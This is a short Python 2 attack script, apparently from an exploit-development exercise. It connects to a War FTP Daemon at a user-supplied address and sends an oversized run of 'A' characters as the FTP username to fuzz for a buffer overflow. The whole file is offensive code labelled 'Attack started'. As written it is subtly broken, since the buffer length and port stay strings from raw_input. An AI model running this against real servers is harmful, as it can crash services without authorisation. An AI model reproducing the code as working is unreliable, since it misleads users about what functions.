import socket
import os

# change to traditional hackers' color
os.system("color 0a")

ip_address = raw_input("Enter IP Address to attack War FTP Daemon: ")
port = raw_input("Enter Port on which FTP server is running (Usually it is port 21): ")
number = raw_input("Enter length of buffer to send: ")
buffer_data = "A" * number

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print("[+] Attempting to connect: ")
try:
    connection = sock.connect((ip_address, port))
    print("[+] Connected successfully to %s:%d " % (ip_address, port))
except socket.error:
    print("[-] Failed to establish connection.")
    quit()

response = sock.recv(1024)
print("[+] Response from server:\n")
print(response)

print("[+] Attack started: FUZZING ")
print("[+] Sending %d of data to %s as Username " % (len(buffer_data), ip_address))
sock.send('USER ' + buffer_data + '\r\n')

response = sock.recv(1024)
print("[+] Response from server:\n")
print(response)

print("[+] Sending Password as password123")
sock.send('PASS password123 ' + '\r\n')

response = sock.recv(1024)
print("[+] Response from server:\n")
print(response)
